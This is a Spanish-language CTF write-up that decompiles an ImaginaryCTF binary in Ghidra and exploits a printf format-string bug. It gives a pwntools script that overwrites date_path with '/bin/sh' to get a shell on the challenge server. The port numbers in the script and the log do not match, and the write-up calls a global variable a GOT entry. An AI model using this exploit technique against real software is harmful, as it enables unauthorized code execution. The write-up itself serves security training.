@@ -1,0 +1,123 @@
+I"�6<p class="lead">En este articulo resolveremos un ejercicio de explotacion binaria de la pagina ImaginaryCTF donde tenemos de sobreescribir la direccion de GOT de printf</p>
+
+<h2 id="analizando-el-binario-con-ghidra">Analizando el binario con Ghidra</h2>
+
+<p>Este ejercicio es muy similar al enterior del post de GOT overwrite y para practicar esta perfecto, solo que ahora no podemos ver el codigo fuente del binario, asi que lo que nos toca es analizarlo con ghidra</p>
+
+<p>Lo primero que vamos a hacer es meter el binario a Ghidra la cual pueden descargar desde su repo oficial</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/NationalSecurityAgency/ghidra/releases
+</code></pre></div></div>
+<p>Despues en la seccion llamada <code class="language-plaintext highlighter-rouge">Symbool tree</code> desplegaremos la carpeta de <code class="language-plaintext highlighter-rouge">functions</code> y le damos click en main, como se ve en la imagen</p>
+
+<p><img src="/assets/img/imaginaryCTF-date2/ghidra1.png" alt="" /></p>
+
+<p>Esto nos arrojara del lado derecho de ghidra el codigo que trato de decompilar donde vemos todo esto:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">local_118</span> <span class="p">[</span><span class="mi">264</span><span class="p">];</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"What</span><span class="se">\'</span><span class="s">s today</span><span class="se">\'</span><span class="s">s date?"</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">local_118</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">local_118</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"????"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"no smh you are wrong the date is "</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="n">date_path</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Viendo la declaracion de variables en la parte de arriba, osea estas:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>long in_FS_OFFSET;
+char local_118 [264];
+long local_10;
+</code></pre></div></div>
+<p>Vemos una en particular que se declara como <code class="language-plaintext highlighter-rouge">char local_118 [264];</code>, esto es el buffer asi que vamos a renombrar la variable <code class="language-plaintext highlighter-rouge">local_118</code> a <code class="language-plaintext highlighter-rouge">buffer</code>, ahora nuestro codigo se ve asi:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">buffer</span> <span class="p">[</span><span class="mi">264</span><span class="p">];</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+  
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"What</span><span class="se">\'</span><span class="s">s today</span><span class="se">\'</span><span class="s">s date?"</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"????"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"no smh you are wrong the date is "</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="n">date_path</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Acortanto mas el codigo para mostrar lo que nos interesa queda el codigo asi:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">puts</span><span class="p">(</span><span class="s">"What</span><span class="se">\'</span><span class="s">s today</span><span class="se">\'</span><span class="s">s date?"</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"????"</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">"no smh you are wrong the date is "</span><span class="p">);</span>
+  <span class="n">system</span><span class="p">(</span><span class="n">date_path</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Esto es sencillo de analizar lo que hace el binario es primeramente con <code class="language-plaintext highlighter-rouge">puts</code> mostrar el mensaje de <code class="language-plaintext highlighter-rouge">What\'s today\'s date?</code>, despues con <code class="language-plaintext highlighter-rouge">fgets(buffer,0x100,stdin);</code> recibe un input que se guardara en <code class="language-plaintext highlighter-rouge">buffer</code> donde el valor maximo que podemos guardar es <code class="language-plaintext highlighter-rouge">0x100</code>, esto pasandolo de hexadecimal a decimal nos da <code class="language-plaintext highlighter-rouge">256</code>, despues hay dos <code class="language-plaintext highlighter-rouge">puts</code> que imprimen unas cadenas (nada relevante), y finalmente la funcion <code class="language-plaintext highlighter-rouge">system</code> manda a llamar a lo que tiene <code class="language-plaintext highlighter-rouge">date_path</code>, y si en Ghidra le damos doble click sobre <code class="language-plaintext highlighter-rouge">date_path</code> vemos lo siguiente</p>
+
+<p><img src="/assets/img/imaginaryCTF-date2/ghidra2.png" alt="" /></p>
+
+<p>Aqui ya esta potente la cosa, por que se esta mandando a llamar al binario <code class="language-plaintext highlighter-rouge">date</code> desde la funcion <code class="language-plaintext highlighter-rouge">system</code> y se sabe que se esta llamando el binario date ya que la ruta es <code class="language-plaintext highlighter-rouge">/usr/bin/date</code>, asi que lo que vamos a hacer es sobreescribir el valor GOT de <code class="language-plaintext highlighter-rouge">date_path</code> por <code class="language-plaintext highlighter-rouge">/bin/sh</code> y como se esta usando la funcion <code class="language-plaintext highlighter-rouge">system</code> nos debe de ejecutar una sh</p>
+
+<h3 id="calculando-el-offset-el-buffer">Calculando el offset el buffer</h3>
+
+<p>De igual manera que el ejercicio anterior de GOT tenemos de encontrar el offset del buffer a travez de format string, asi que le pasaremos el binario algunas A y algunos format string <code class="language-plaintext highlighter-rouge">AAAAAAAA %p %p %p %p %p %p %p %p</code>, cuando lo ejecutemos nos muestra esto</p>
+
+<p><img src="/assets/img/imaginaryCTF-date2/vuln1.png" alt="" /></p>
+
+<p>Si empezamos a contar desde <code class="language-plaintext highlighter-rouge">0x7ffff7dfda63</code> hasta donde empiezan nuestras “A” que es donde esta seleccionado en la imagen nos da como resultado 6, asi que ese es el offset el buffer</p>
+
+<h2 id="ejecutando-el-exploit">Ejecutando el exploit</h2>
+
+<p>EL exploit usado es similar al del post anterior de GOT, lo que cambia es que nos estamos conectando remotamente a eth007.me.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./vuln"</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"eth007.me"</span><span class="p">,</span> <span class="mi">42042</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">writes</span><span class="o">=</span><span class="p">{</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">date_path</span><span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)}))</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Si lo ejecutamos y listamos el contenido podemos ver la flag</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Opening connection to eth007.me on port 42069: Done
+[*] '/home/omarh/Escritorio/vuln'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Switching to interactive mode
+no smh you are wrong the date is 
+$ ls
+flag.txt
+</code></pre></div></div>
+<p>Eso ha sido todo, gracias por leer ❤</p>
+:ET
